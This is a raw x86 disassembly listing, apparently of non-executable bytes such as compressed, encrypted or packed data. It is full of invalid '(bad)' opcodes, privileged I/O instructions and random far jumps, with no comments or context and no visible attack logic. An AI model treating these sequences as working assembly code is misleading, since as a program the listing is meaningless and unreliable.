  404835:	shl    DWORD PTR [edi],0xf8
  404838:	xchg   edi,eax
  404839:	xchg   edi,eax
  40483a:	cmp    DWORD PTR [edi],0x2fbd75e5
  404840:	adc    al,0x90
  404842:	pop    ss
  404843:	inc    ebx
  404844:	xchg   ebx,eax
  404845:	je     0x404816
  404847:	xchg   edx,eax
  404848:	fsub   DWORD PTR [ebx+0x6d5b9d35]
  40484e:	lahf   
  40484f:	ficom  DWORD PTR ds:0x668c98f1
  404855:	int    0xdf
  404857:	jecxz  0x404822
  404859:	jns    0x4047ef
  40485b:	add    bh,BYTE PTR [ebp+0x46a62288]
  404861:	shl    DWORD PTR [edi],cl
  404863:	stos   BYTE PTR es:[edi],al
  404864:	test   al,0x5
  404866:	push   esp
  404867:	retf   0x9749
  40486a:	adc    edx,DWORD PTR [edx]
  40486c:	out    dx,al
  40486d:	xor    BYTE PTR [edx-0x2e084cfb],ch
  404873:	nop
  404874:	nop
  404875:	sti    
  404876:	mov    ds:0xd5a4a5de,al
  40487b:	mov    ds:0x6039f73b,eax
  404880:	sub    DWORD PTR [edx+0x3f],eax
  404883:	xchg   DWORD PTR [edx],ebx
  404885:	cmp    eax,0x25ece7f0
  40488a:	mov    esi,0xb904335c
  40488f:	mov    dh,0x57
  404891:	cmp    DWORD PTR [edi-0x59],ebp
  404894:	inc    ebp
  404895:	push   ds
  404896:	inc    edi
  404897:	in     al,dx
  404898:	sub    bh,bl
  40489a:	pop    ds
  40489b:	push   edx
  40489c:	inc    edx
  40489d:	lods   eax,DWORD PTR ds:[esi]
  40489e:	daa    
  40489f:	add    edi,DWORD PTR [ecx-0x7aea74b3]
  4048a5:	sbb    al,0xce
  4048a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048a8:	jle    0x4048ef
  4048aa:	sti    
  4048ab:	jmp    0x26e5:0x3390eb88
  4048b2:	imul   BYTE PTR [ecx]
  4048b4:	shl    BYTE PTR [ecx],1
  4048b6:	das    
  4048b7:	pop    es
  4048b8:	xchg   BYTE PTR [ebp-0x5e759f93],al
  4048be:	call   0xa8f:0x85ae0428
  4048c5:	inc    eax
  4048c6:	lahf   
  4048c7:	dec    ecx
  4048c8:	jb     0x404880
  4048ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048cb:	repnz into 
  4048cd:	pop    ecx
  4048ce:	aas    
  4048cf:	clc    
  4048d0:	outs   dx,DWORD PTR ds:[esi]
  4048d1:	mov    ds:0x4ae0aadf,al
  4048d6:	pop    ebx
  4048d7:	loopne 0x4048c6
  4048d9:	jmp    0x404927
  4048db:	ins    BYTE PTR es:[edi],dx
  4048dc:	add    al,0x9b
  4048de:	or     eax,esi
  4048e0:	test   al,0xae
  4048e2:	popa   
  4048e3:	xchg   edx,eax
  4048e4:	xlat   BYTE PTR ds:[ebx]
  4048e5:	mov    eax,ds:0xdcf4c510
  4048ea:	sub    DWORD PTR [esi],ebx
  4048ec:	cmp    al,0x8f
  4048ee:	nop
  4048ef:	cmp    edx,eax
  4048f1:	fwait
  4048f2:	loopne 0x404876
  4048f4:	dec    esi
  4048f5:	cmp    eax,0x5b259ee6
  4048fa:	pop    edi
  4048fb:	jae    0x4048b6
  4048fd:	dec    edx
  4048fe:	aaa    
  4048ff:	and    bh,cl
  404901:	scas   al,BYTE PTR es:[edi]
  404902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404903:	sub    BYTE PTR [esi],cl
  404905:	sub    eax,DWORD PTR [eax]
  404907:	mov    al,BYTE PTR [ebp+0x23]
  40490a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40490b:	lock add eax,0x360f8ebf
  404911:	push   0xffffff91
  404913:	jb     0x4048ed
  404915:	dec    ebp
  404916:	cs push edi
  404918:	cld    
  404919:	das    
  40491a:	adc    DWORD PTR [edx],ecx
  40491c:	shl    BYTE PTR [ebp+0x8ea623b],1
  404922:	scas   al,BYTE PTR es:[edi]
  404923:	mov    BYTE PTR [esi+0x3e],ch
  404926:	fwait
  404927:	test   al,0x22
  404929:	xchg   edi,edx
  40492b:	cld    
  40492c:	shl    DWORD PTR [edx+esi*1-0x29],1
  404930:	and    dl,BYTE PTR [esi-0x48]
  404933:	fldenv [edi+0xb]
  404936:	ins    DWORD PTR es:[edi],dx
  404937:	fwait
  404938:	daa    
  404939:	lods   eax,DWORD PTR ds:[esi]
  40493a:	(bad)  
  40493c:	shl    DWORD PTR [edi+0x23733472],cl
  404942:	pop    es
  404943:	jae    0x40490b
  404945:	push   ecx
  404946:	repnz and eax,0x22fe08cf
  40494c:	push   ds
  40494d:	out    dx,al
  40494e:	in     al,0xf3
  404950:	sbb    eax,0x73427847
  404955:	lahf   
  404956:	or     DWORD PTR [esi+0x1b],ebp
  404959:	xor    dh,BYTE PTR [edx+0x3e8f9f15]
  40495f:	pop    eax
  404960:	jmp    0x795:0x22d8
  404966:	fnstcw WORD PTR [ebx]
  404968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404969:	inc    ebp
  40496a:	sub    edi,DWORD PTR [esi+0x306d30df]
  404970:	sub    esp,ecx
  404972:	lock lea ecx,ds:0x24b8
  404978:	clc    
  404979:	mov    ah,0x36
  40497b:	lods   eax,DWORD PTR ds:[esi]
  40497c:	nop
  40497d:	xlat   BYTE PTR ds:[ebx]
  40497e:	out    0xdc,al
  404980:	pop    edi
  404981:	in     al,dx
  404982:	xchg   edx,eax
  404983:	fdiv   DWORD PTR [edi]
  404985:	enter  0x2625,0x7e
  404989:	inc    ecx
  40498a:	ret    
  40498b:	jmp    0x4049c1
  40498d:	pop    edi
  40498e:	cmc    
  40498f:	dec    ebp
  404990:	cs sub eax,0x4d2c4a81
  404996:	jge    0x4049fe
  404998:	push   eax
  404999:	mov    edi,0xfee7ac10
  40499e:	add    ebx,ebp
  4049a0:	pop    ebx
  4049a1:	std    
  4049a2:	(bad)  
  4049a3:	or     eax,0xa03ba601
  4049a8:	cmc    
  4049a9:	sub    ebp,DWORD PTR [edi-0x740da641]
  4049af:	and    al,BYTE PTR [edi-0x38]
  4049b2:	mov    ah,0x47
  4049b4:	sub    BYTE PTR [ebx+0x2b],dl
  4049b7:	adc    dl,ch
  4049b9:	mov    edi,0xad7deb80
  4049be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049bf:	jp     0x4049d4
  4049c1:	jns    0x4049fc
  4049c3:	out    dx,al
  4049c4:	or     dl,BYTE PTR [ebp-0xc90e2d2]
  4049ca:	xchg   esi,eax
  4049cb:	xchg   dl,bl
  4049cd:	adc    DWORD PTR [ebx-0x413fc739],0x6b38bf4
  4049d7:	jae    0x404a2a
  4049d9:	mov    esp,0x76edafcc
  4049de:	dec    ebp
  4049df:	pushf  
  4049e0:	and    al,0x7e
  4049e2:	pop    edx
  4049e3:	xchg   ebx,eax
  4049e4:	(bad)  
  4049e5:	shl    DWORD PTR [ebp-0x14],cl
  4049e8:	xchg   dl,dl
  4049ea:	fadd   QWORD PTR [ebx+ebp*4-0x4a]
  4049ee:	enter  0xc9,0xa7
  4049f2:	pushf  
  4049f3:	inc    eax
  4049f4:	ins    BYTE PTR es:[edi],dx
  4049f5:	xor    bl,BYTE PTR [edi+0x674a7f44]
  4049fb:	out    dx,al
  4049fc:	sub    cl,dl
  4049fe:	add    al,0x9e
  404a00:	inc    ebp
  404a01:	ret    0x5ba
  404a04:	mov    ds:0x47ef702,al
  404a09:	lods   al,BYTE PTR ds:[esi]
  404a0a:	sbb    al,0x74
  404a0c:	cmp    BYTE PTR [ecx-0x77],al
  404a0f:	sbb    edi,DWORD PTR [esi-0x45]
  404a12:	jo     0x4049b9
  404a14:	je     0x404a0c
  404a16:	jp     0x404a1a
  404a18:	test   al,0x1e
  404a1a:	inc    edx
  404a1b:	sti    
  404a1c:	pop    ss
  404a1d:	mov    dh,0xcb
  404a1f:	xor    edi,ebp
  404a21:	mov    dl,0xc6
  404a23:	aam    0x54
  404a25:	xchg   BYTE PTR [ebx],cl
  404a27:	jecxz  0x404a52
  404a29:	rcr    ecx,0x24
  404a2c:	inc    esi
  404a2d:	cmp    eax,0xd5efe2e6
  404a32:	sub    eax,0x670a373d
  404a37:	jo     0x404a5b
  404a39:	sti    
  404a3a:	neg    ecx
  404a3c:	mov    al,al
  404a3e:	cdq    
  404a3f:	and    bl,ch
  404a41:	or     BYTE PTR [eax],al
  404a43:	out    dx,al
  404a44:	cmp    ch,dl
  404a46:	std    
  404a47:	cs mov al,0x10
  404a4a:	cli    
  404a4b:	mov    ah,0xfd
  404a4d:	fwait
  404a4e:	jns    0x404a79
  404a50:	xlat   BYTE PTR ds:[ebx]
  404a51:	mov    dl,0x9d
  404a53:	or     DWORD PTR [ebp+0x43b3801b],ebp
  404a59:	adc    ebp,ebp
  404a5b:	popf   
  404a5c:	repz scas al,BYTE PTR es:[edi]
  404a5e:	mov    ds:0xaf0a2631,al
  404a63:	sbb    eax,0xde3faa43
  404a68:	adc    edx,DWORD PTR [esi-0x5ceda1e7]
  404a6e:	push   ebp
  404a6f:	push   ss
  404a70:	pop    es
  404a71:	pop    es
  404a72:	jge    0x404aa1
  404a74:	call   0xb7372332
  404a79:	push   esp
  404a7a:	and    DWORD PTR [ebx+0x1a],0xffffffff
  404a7e:	shl    BYTE PTR [edi+ebx*1+0x60],0x38
  404a83:	cdq    
  404a84:	or     al,0x1
  404a86:	mov    ebp,0x43497a78
  404a8b:	or     bl,BYTE PTR [edi-0x37]
  404a8e:	xchg   edi,eax
  404a8f:	(bad)  
  404a90:	bound  ebx,QWORD PTR [edi]
  404a92:	push   es
  404a93:	(bad)  
  404a94:	sub    al,BYTE PTR [esi-0x3a5fc008]
  404a9a:	sub    eax,0x4ee603a0
  404a9f:	xchg   esp,eax
  404aa0:	data16 jl 0x404aa6
  404aa3:	push   0x13f967b
  404aa8:	jo     0x404ae1
  404aaa:	fdiv   DWORD PTR [eax]
  404aac:	jmp    0x47f892d0
  404ab1:	scas   eax,DWORD PTR es:[edi]
  404ab2:	stc    
  404ab3:	ja     0x404ac2
  404ab5:	outs   dx,BYTE PTR ds:[esi]
  404ab6:	add    cl,BYTE PTR [esi-0xf]
  404ab9:	scas   al,BYTE PTR es:[edi]
  404aba:	ds das 
  404abc:	adc    DWORD PTR [eax+0x53],ebx
  404abf:	dec    ebx
  404ac0:	xchg   ecx,eax
  404ac1:	mov    fs,WORD PTR [ebx]
  404ac3:	mov    ds:0xed07c3e0,eax
  404ac8:	mov    al,ds:0x6c463937
  404acd:	adc    eax,DWORD PTR [ecx+0x48ae377c]
  404ad3:	ss lahf 
  404ad5:	in     eax,dx
  404ad6:	ja     0x404a8d
  404ad8:	arpl   WORD PTR [ebx+ebp*2],si
  404adb:	cmp    ebp,ebp
  404add:	cmp    ecx,DWORD PTR [esi]
  404adf:	fst    DWORD PTR [esp+edx*8+0x7b]
  404ae3:	pop    esp
  404ae4:	popa   
  404ae5:	loopne 0x404b23
  404ae7:	or     BYTE PTR [ebx+0x347ebcc5],dl
  404aed:	dec    edi
  404aee:	dec    ecx
  404aef:	loope  0x404ad3
  404af1:	sbb    ebp,edx
  404af3:	or     al,0xbf
  404af5:	push   ebp
  404af6:	mov    esi,0x5637c8f9
  404afb:	sbb    esi,DWORD PTR [edi+ebx*8]
  404afe:	loopne 0x404b21
  404b00:	inc    esp
  404b01:	xchg   ebx,eax
  404b03:	xchg   DWORD PTR [eax-0x61626c35],esp
  404b09:	lods   al,BYTE PTR ds:[esi]
  404b0a:	pop    esi
  404b0b:	pop    ds
  404b0c:	icebp  
  404b0d:	push   edi
  404b0e:	mov    cs,WORD PTR [edi+0x19fb6776]
  404b14:	inc    esi
  404b15:	cmp    al,0x3e
  404b17:	(bad)  
  404b18:	xchg   edi,eax
  404b19:	jecxz  0x404afa
  404b1b:	ins    DWORD PTR es:[edi],dx
  404b1c:	int3   
  404b1d:	cmp    al,0x46
  404b1f:	cli    
  404b20:	lds    ebx,FWORD PTR [eax]
  404b22:	mov    eax,0x89ed3f5
  404b27:	push   ds
  404b28:	mov    esp,0x886caf9
  404b2d:	fwait
  404b2e:	in     eax,0x85
  404b30:	clc    
  404b31:	push   ebx
  404b32:	and    DWORD PTR [ebp+edx*8-0xa],0x8a19cf6
  404b3a:	mov    eax,?
  404b3c:	push   ecx
  404b3d:	inc    edi
  404b3e:	xchg   DWORD PTR [edi+0x67ff9d8a],edi
  404b44:	xchg   esi,eax
  404b45:	inc    ecx
  404b46:	sbb    DWORD PTR [ebp+0x5d],0x2a5a4b88
  404b4d:	les    ecx,FWORD PTR [edx-0x3f]
  404b50:	cmp    ch,BYTE PTR [ebx+0x79]
  404b53:	push   ss
  404b54:	mov    dl,0x5
  404b56:	loop   0x404b9e
  404b58:	add    ebp,edx
  404b5a:	ds clc 
  404b5c:	sahf   
  404b5d:	add    bh,BYTE PTR [ebp+0x1c875d16]
  404b63:	icebp  
  404b64:	sti    
  404b65:	mov    ecx,0x88e65246
  404b6a:	cwde   
  404b6b:	leave  
  404b6c:	pop    ebp
  404b6d:	fbstp  TBYTE PTR [ebp+0x576c0545]
  404b73:	and    eax,0xa492b328
  404b78:	mov    ebx,0xcc408cc
  404b7d:	lds    edi,FWORD PTR [ecx-0xe5bc381]
  404b83:	pop    ds
  404b84:	std    
  404b85:	jo     0x404b92
  404b87:	inc    ebp
  404b88:	jge    0x404bd8
  404b8a:	mov    ds:0xb23b45c1,eax
  404b8f:	xor    ch,BYTE PTR [ebx+0x2a7834f3]
  404b95:	sbb    esp,DWORD PTR [ecx+0x20]
  404b98:	arpl   WORD PTR [edi+eax*2-0x4b],sp
  404b9c:	cmp    eax,0xebcd9e71
  404ba1:	cmp    bh,ch
  404ba3:	aaa    
  404ba4:	(bad)  
  404ba6:	dec    edx
  404ba7:	je     0x404c0d
  404ba9:	out    dx,eax
  404baa:	push   esi
  404bab:	addr16 adc dl,bl
  404bae:	jecxz  0x404c1e
  404bb0:	rol    bl,cl
  404bb2:	cmp    ebx,DWORD PTR [ebp*2-0x7e63d52]
  404bb9:	xor    al,0x42
  404bbb:	jmp    0xd692:0xeced8203
  404bc2:	xchg   ebp,eax
  404bc3:	gs inc ecx
  404bc5:	outs   dx,BYTE PTR ds:[esi]
  404bc6:	imul   esi,DWORD PTR [esi-0x18],0x4d
  404bca:	add    BYTE PTR [edi+0x62],al
  404bcd:	dec    esp
  404bce:	dec    esi
  404bcf:	sub    dl,dh
  404bd1:	out    dx,al
  404bd2:	sbb    al,0x2f
  404bd4:	xchg   ebp,eax
  404bd5:	dec    BYTE PTR [esi-0x4b3d556]
  404bdb:	stc    
  404bdc:	sti    
  404bdd:	pop    esi
  404bde:	add    BYTE PTR [ebp+ebx*1-0x25b73310],ah
  404be5:	sub    al,0xe3
  404be7:	cwde   
  404be8:	retf   0x4b7c
  404beb:	lods   al,BYTE PTR ds:[esi]
  404bec:	out    0xaf,al
  404bee:	push   eax
  404bef:	iret   
  404bf0:	add    eax,0x2da3a524
  404bf5:	imul   ebx,DWORD PTR [esi+edx*1],0x4d
  404bf9:	mov    dh,BYTE PTR [eax]
  404bfb:	push   esp
  404bfc:	xchg   edi,eax
  404bfd:	mov    bl,BYTE PTR [edx-0x50]
  404c00:	std    
  404c01:	mov    bl,BYTE PTR [edx+0x6f38596c]
  404c07:	fld    QWORD PTR [ecx-0x27ed348a]
  404c0d:	pusha  
  404c0e:	out    dx,eax
  404c0f:	jge    0x404bd9
  404c11:	mov    al,ds:0x3f3b6000
  404c16:	mov    esi,0x475ae9c5
  404c1b:	js     0x404bab
  404c1d:	(bad)  
  404c1e:	xchg   ecx,eax
  404c1f:	stc    
  404c20:	out    0x3f,al
  404c22:	ror    DWORD PTR [edx+0x2f8fb156],cl
  404c28:	dec    eax
  404c29:	mov    bh,0xcf
  404c2b:	add    eax,0x723021fb
  404c30:	push   es
  404c31:	jmp    FWORD PTR [ebx+0x6b3a7df3]
  404c37:	call   0x2c7a:0x8444be0a
  404c3e:	adc    al,dl
  404c40:	in     al,0x14
  404c42:	xor    dh,BYTE PTR [ecx]
  404c44:	sti    
  404c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c46:	ss int 0x17
  404c49:	mov    ch,0x16
  404c4b:	or     BYTE PTR [ecx+eax*2],bh
  404c4e:	fst    QWORD PTR [edx+eiz*1]
  404c51:	stc    
  404c52:	push   ecx
  404c53:	mov    ch,bl
  404c55:	xchg   edi,eax
  404c56:	pop    eax
  404c57:	aam    0x9a
  404c59:	jecxz  0x404c54
  404c5b:	pop    edi
  404c5c:	mov    ebx,0x65e88903
  404c61:	push   0x3c3eb841
  404c66:	cmp    bl,ch
  404c68:	push   eax
  404c69:	rol    eax,0x12
  404c6c:	and    DWORD PTR [eax+0x54],edx
  404c6f:	loope  0x404c88
  404c71:	mov    ds:0xa73a1a56,al
  404c76:	mov    ah,0xbd
  404c78:	adc    bl,al
  404c7a:	push   ebx
  404c7b:	imul   ecx,DWORD PTR [ecx+0x36767a5b],0x2fcea6c5
  404c85:	je     0x404d04
  404c87:	ret    
  404c88:	rcr    ebx,cl
  404c8a:	(bad)  
  404c8b:	out    0xd1,eax
  404c8d:	or     ecx,ecx
  404c8f:	sub    al,BYTE PTR [eax]
  404c91:	inc    ecx
  404c92:	fist   DWORD PTR [edx-0x79]
  404c95:	adc    eax,0x7112a63f
  404c9a:	pop    ebx
  404c9b:	enter  0xa298,0x65
  404c9f:	xchg   ebx,esp
  404ca1:	loope  0x404c9c
  404ca3:	into   
  404ca4:	(bad)  
  404ca5:	mov    edi,0x57e2e558
  404caa:	aaa    
  404cab:	xor    al,0x3d
  404cad:	das    
  404cae:	dec    ebx
  404caf:	xor    DWORD PTR [edi-0x771a824a],eax
  404cb5:	xchg   DWORD PTR [eax-0x92225c4],ebx
  404cbb:	mov    edi,DWORD PTR [edx+0xbd9b846]
  404cc1:	or     BYTE PTR [ebx],ch
  404cc3:	scas   al,BYTE PTR es:[edi]
  404cc4:	mov    ah,0x2
  404cc6:	jae    0x404cfa
  404cc8:	xor    eax,0xa5b901bd
  404ccd:	ins    BYTE PTR es:[edi],dx
  404cce:	dec    esp
  404ccf:	in     eax,0xdb
  404cd1:	jnp    0x404d25
  404cd3:	or     ebx,DWORD PTR [esi]
  404cd5:	(bad)  
  404cd7:	stos   DWORD PTR es:[edi],eax
  404cd8:	js     0x404c9d
  404cda:	cmp    DWORD PTR ds:0x653453ad,ebp
  404ce0:	(bad)  
  404ce1:	jbe    0x404cba
  404ce3:	fcomp  DWORD PTR [edi+ebx*8]
  404ce6:	mov    edx,0xc0ccff5b
  404ceb:	mov    ebp,0x824f4ffb
  404cf0:	sbb    eax,0xf02df627
  404cf5:	(bad)  
  404cf6:	jp     0x404ca3
  404cf8:	les    edi,FWORD PTR [edx-0x55]
  404cfb:	(bad)  
  404cfc:	mov    ecx,0xf55eae55
  404d01:	outs   dx,DWORD PTR ds:[esi]
  404d02:	aaa    
  404d03:	in     al,0x36
  404d05:	inc    esi
  404d06:	lods   eax,DWORD PTR ds:[esi]
  404d07:	mov    ebx,0x9dce0f1c
  404d0c:	rol    BYTE PTR [esi],0x4e
  404d0f:	mul    DWORD PTR [edi]
  404d11:	cmp    bh,BYTE PTR [edx]
  404d13:	inc    esp
  404d14:	fistp  DWORD PTR [ecx-0x7d]
  404d17:	xlat   BYTE PTR ds:[ebx]
  404d18:	inc    esi
  404d19:	idiv   bl
  404d1b:	outs   dx,DWORD PTR ds:[esi]
  404d1c:	and    ebx,DWORD PTR [eax]
  404d1e:	cld    
  404d1f:	push   0x77
  404d21:	add    bl,BYTE PTR [ecx-0x10d97233]
  404d27:	push   ebp
  404d28:	xchg   esp,eax
  404d29:	or     eax,0x51cd0dc2
  404d2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d2f:	(bad)  
  404d30:	test   ax,0xcf90
  404d34:	push   edx
  404d35:	repnz imul eax,DWORD PTR [edx],0x90585bf6
  404d3c:	rcl    ebx,cl
  404d3e:	xor    edx,ebp
  404d40:	loopne 0x404d1a
  404d42:	retf   
  404d43:	inc    edx
  404d44:	push   es
  404d45:	mov    ebx,0xd34a0b92
  404d4a:	jb     0x404d3e
  404d4c:	cmp    BYTE PTR [ebp+0x4909950a],dl
  404d52:	(bad)  ds:0xf31399c9
  404d58:	repnz pop es
  404d5a:	push   ebp
  404d5b:	popa   
  404d5c:	jmp    0x44fbaed5
  404d61:	ret    
  404d62:	jecxz  0x404d94
  404d64:	inc    DWORD PTR [eax]
  404d66:	clc    
  404d67:	jg     0x404d0f
  404d69:	in     eax,0xd0
  404d6b:	(bad)  
  404d6c:	ror    BYTE PTR [edx],cl
  404d6e:	(bad)  
  404d6f:	call   0x9ff1d5ab
  404d74:	push   es
  404d75:	ins    BYTE PTR es:[edi],dx
  404d76:	call   0xb513a327
  404d7b:	ret    0xe01f
  404d7e:	dec    eax
  404d7f:	dec    edx
  404d80:	popa   
  404d81:	mov    al,0x5e
  404d83:	adc    BYTE PTR [ebp+0x1e34dd2e],bh
  404d89:	mov    al,0x4
  404d8b:	inc    esp
  404d8c:	jns    0x404d38
  404d8e:	add    edx,DWORD PTR [ebx-0x44184879]
  404d94:	std    
  404d95:	xchg   esp,eax
  404d96:	adc    ebp,DWORD PTR [ebp+0x7]
  404d99:	pop    ecx
  404d9a:	loop   0x404d67
  404d9c:	or     DWORD PTR [esi+0x4177fba6],esp
  404da2:	adc    bh,al
  404da4:	pop    esp
  404da5:	int3   
  404da6:	outs   dx,BYTE PTR ds:[esi]
  404da7:	cmp    BYTE PTR [edx-0x2],dl
  404daa:	cmp    dh,0x1b
  404dad:	sahf   
  404dae:	push   edx
  404daf:	popf   
  404db0:	dec    eax
  404db1:	xchg   edx,eax
  404db2:	lods   eax,DWORD PTR ds:[esi]
  404db3:	dec    esi
  404db4:	in     al,dx
  404db5:	mov    bl,0x1b
  404db7:	fld    st(2)
  404db9:	add    eax,0xb6c06ab7
  404dbe:	test   DWORD PTR [ebp+esi*1+0x207ca704],0x7caecbec
  404dc9:	inc    esp
  404dca:	pop    ss
  404dcb:	fistp  QWORD PTR [edx+0x30]
  404dce:	ins    DWORD PTR es:[edi],dx
  404dcf:	dec    esi
  404dd0:	add    eax,0xee59a8bc
  404dd5:	cmp    eax,0x4cdd3c3a
  404dda:	jge    0x404e56
  404ddc:	or     DWORD PTR [ebx+eax*1+0x12],0xffffffb8
  404de1:	les    esi,FWORD PTR [edx+0x7e135b77]
  404de7:	icebp  
  404de8:	nop
  404de9:	cdq    
  404dea:	daa    
  404deb:	stc    
  404dec:	loopne 0x404e6c
  404dee:	fisttp QWORD PTR [edx]
  404df0:	mov    esi,0xeaeabf3b
  404df5:	or     DWORD PTR [esi+0x7b],edx
  404df8:	lods   eax,DWORD PTR ds:[esi]
  404df9:	push   0xffffff98
  404dfb:	dec    edx
  404dfc:	inc    ebp
  404dfd:	jbe    0x404e46
  404dff:	ror    BYTE PTR [edx+esi*8-0x424c0551],cl
  404e06:	xlat   BYTE PTR ds:[ebx]
  404e07:	xchg   edx,eax
  404e08:	repnz rcl BYTE PTR [ebp-0x5174abbf],0xb3
  404e10:	push   eax
  404e11:	or     edx,DWORD PTR [ecx]
  404e13:	cmp    ah,BYTE PTR [ebx-0x21ce6b4f]
  404e19:	and    ecx,DWORD PTR [ebx+0x2f99ab1d]
  404e1f:	js     0x404e20
  404e21:	ret    0x2c67
  404e24:	inc    edx
  404e25:	lea    edx,[edi-0x36]
  404e28:	mov    ch,0xef
  404e2a:	test   BYTE PTR [edi+eax*1-0x6d],ah
  404e2e:	add    al,0xed
  404e30:	mov    ah,0x87
  404e32:	out    0xe7,eax
  404e34:	xchg   esp,eax
  404e35:	push   edx
  404e36:	push   ebp
  404e37:	add    BYTE PTR [edx],al
  404e39:	hlt    
  404e3a:	adc    al,cl
  404e3c:	call   0x44f13593
  404e41:	jns    0x404e82
  404e43:	push   ecx
  404e44:	es jmp 0x5e6f9b88
  404e4a:	aam    0x88
  404e4c:	das    
  404e4d:	mov    bl,0x36
  404e4f:	and    BYTE PTR [esi],ah
  404e51:	jg     0x404dfa
  404e53:	mov    ds:0x9bcc3e90,eax
  404e58:	add    al,0xe8
  404e5a:	hlt    
  404e5b:	inc    ebp
  404e5c:	mov    ecx,0x4822b29c
  404e61:	jl     0x404ec0
  404e63:	sub    esi,DWORD PTR [ecx-0x3]
  404e66:	jmp    0x9ef6:0xc874af54
  404e6d:	out    dx,al
  404e6e:	or     BYTE PTR [ebx-0x7faa7631],ah
  404e74:	mov    ah,0x79
  404e76:	cld    
  404e77:	jle    0x404ed4
  404e79:	sub    eax,0x40dc04ea
  404e7e:	xchg   esp,eax
  404e7f:	les    esi,FWORD PTR [ebx]
  404e81:	ficomp DWORD PTR [eax+0x7bdab662]
  404e87:	jno    0x404e3f
  404e89:	jnp    0x404efb
  404e8b:	push   esi
  404e8c:	mov    al,0xfe
  404e8e:	jmp    DWORD PTR [ebp+0x4e]
  404e91:	sbb    eax,0xb75132c7
  404e96:	add    BYTE PTR [eax],ah
  404e98:	mov    DWORD PTR [esi],edi
  404e9a:	lock mov esp,0xfd744a1
  404ea0:	jge    0x404e60
  404ea2:	sbb    esi,DWORD PTR [edx-0x1a]
  404ea5:	js     0x404f1b
  404ea7:	add    DWORD PTR [ebp-0x13],eax
  404eaa:	clc    
  404eab:	iret   
  404eac:	aas    
  404ead:	ja     0x404e43
  404eaf:	jle    0x404edd
  404eb1:	es dec esp
  404eb3:	add    esp,DWORD PTR [edx+0x62d9365]
  404eb9:	fisttp DWORD PTR cs:[esi+0x5c]
  404ebd:	shl    ah,0x1a
  404ec0:	xor    esi,ecx
  404ec2:	or     al,0xc8
  404ec4:	aas    
  404ec5:	outs   dx,DWORD PTR ds:[esi]
  404ec6:	out    0xf4,eax
  404ec8:	push   0xffffffcd
  404eca:	in     al,dx
  404ecb:	push   ebp
  404ecc:	push   es
  404ecd:	mov    DWORD PTR [edi],ebx
  404ecf:	iret   
  404ed0:	mov    edx,0xc559313b
  404ed5:	mov    al,0x2f
  404ed7:	inc    ebx
  404ed8:	mov    ebp,0x6f0cdff
  404edd:	pop    esi
  404ede:	or     al,0xbb
  404ee0:	cvtpi2ps xmm1,mm1
  404ee3:	adc    ah,al
  404ee5:	test   al,0x80
  404ee7:	mov    DWORD PTR [edi+0x47],edi
  404eea:	rol    DWORD PTR [ebx],1
  404eec:	mov    ecx,DWORD PTR [edx]
  404eee:	cld    
  404eef:	sbb    eax,ebp
  404ef1:	mov    DWORD PTR [ebp+0x20],esp
  404ef4:	mov    al,0xb2
  404ef6:	sahf   
  404ef7:	lahf   
  404ef8:	push   edx
  404ef9:	push   esi
  404efa:	mov    ?,WORD PTR [ecx-0xd]
  404efd:	gs mov dh,0xf2
  404f00:	pusha  
  404f01:	popf   
  404f02:	inc    ebx
  404f03:	mov    ds:0xccd6d83a,al
  404f08:	(bad)  
  404f09:	fwait
  404f0a:	outs   dx,DWORD PTR ds:[esi]
  404f0b:	xchg   ebx,eax
  404f0c:	and    BYTE PTR [ebx+0x76],ah
  404f0f:	jg     0x404ef0
  404f11:	mov    ds:0xed0a43f8,eax
  404f16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f17:	das    
  404f18:	cmp    bh,BYTE PTR [ebx-0x6ce19b14]
  404f1e:	shr    BYTE PTR [esi-0x112ecb91],cl
  404f24:	sub    eax,0x4b557ce4
  404f29:	push   ecx
  404f2a:	xchg   esi,eax
  404f2b:	add    ebp,ecx
  404f2d:	xchg   esp,eax
  404f2e:	das    
  404f2f:	retf   0x3000
  404f32:	stos   DWORD PTR es:[edi],eax
  404f33:	mov    eax,0xf57088fb
  404f38:	ss jne 0x404f6e
  404f3b:	out    0x88,eax
  404f3d:	jno    0x404f19
  404f3f:	inc    esp
  404f40:	inc    eax
  404f41:	int3   
  404f42:	adc    al,0x48
  404f44:	cmp    esi,esi
  404f46:	mov    ah,0x87
  404f48:	jb     0x404f91
  404f4a:	push   eax
  404f4b:	jg     0x404f9d
  404f4d:	cld    
  404f4e:	push   edi
  404f4f:	pop    eax
  404f50:	shr    BYTE PTR [edi-0x2559814e],0x8f
  404f57:	sub    edi,DWORD PTR [edi+0x19]
  404f5a:	aaa    
  404f5b:	hlt    
  404f5c:	jno    0x404fce
  404f5e:	repnz cwde 
  404f60:	and    eax,DWORD PTR [esi]
  404f62:	mov    ebx,0xc7416bf3
  404f67:	mov    ebx,0xa63e9a28
  404f6c:	jo     0x404fd2
  404f6e:	sub    esp,ebx
  404f70:	sete   BYTE PTR [eax+eax*2+0x7e]
  404f75:	and    ecx,eax
  404f77:	add    DWORD PTR [esi+0x3f],edx
  404f7a:	mov    ds:0x1ac8ddaf,eax
  404f7f:	inc    esp
  404f80:	cdq    
  404f81:	or     edi,0xc9bd92b5
  404f87:	in     al,dx
  404f88:	rcl    DWORD PTR [ebp-0x1141cb83],0xf0
  404f8f:	inc    esp
  404f90:	stos   BYTE PTR es:[edi],al
  404f91:	jecxz  0x404f92
  404f93:	int3   
  404f94:	or     esi,0x9106574a
  404f9a:	add    eax,0x29e05729
  404f9f:	mov    ecx,0xcea22072
  404fa4:	cmp    dl,BYTE PTR [ebp-0x76]
  404fa7:	pusha  
  404fa8:	loope  0x404f35
  404faa:	stos   BYTE PTR es:[edi],al
  404fab:	call   0xd1aa:0x8ea507bc
  404fb2:	call   0xc934:0xd26b8a9f
  404fb9:	add    DWORD PTR ds:0xf548531c,0xffffffa6
  404fc0:	popa   
  404fc1:	mov    edx,edx
  404fc3:	(bad)  
  404fc4:	lahf   
  404fc5:	sbb    edi,DWORD PTR [ebp-0x6cd10236]
  404fcb:	pop    edi
